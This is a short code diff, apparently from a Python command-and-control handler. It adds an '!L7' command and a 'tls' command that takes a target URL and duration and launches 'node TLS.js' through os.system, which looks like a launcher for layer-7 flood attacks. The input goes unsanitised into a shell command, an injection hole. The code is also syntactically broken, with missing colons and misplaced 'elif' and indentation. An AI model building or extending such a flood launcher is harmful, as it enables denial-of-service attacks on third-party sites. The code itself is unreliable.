@@ -64,5 +64,10 @@ def command():
     elif command == "!help" 
         help()
     elif command == "!L7"
-
+        l7()
+elif command == "tls"
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node TLS.js {url} {time}')
         
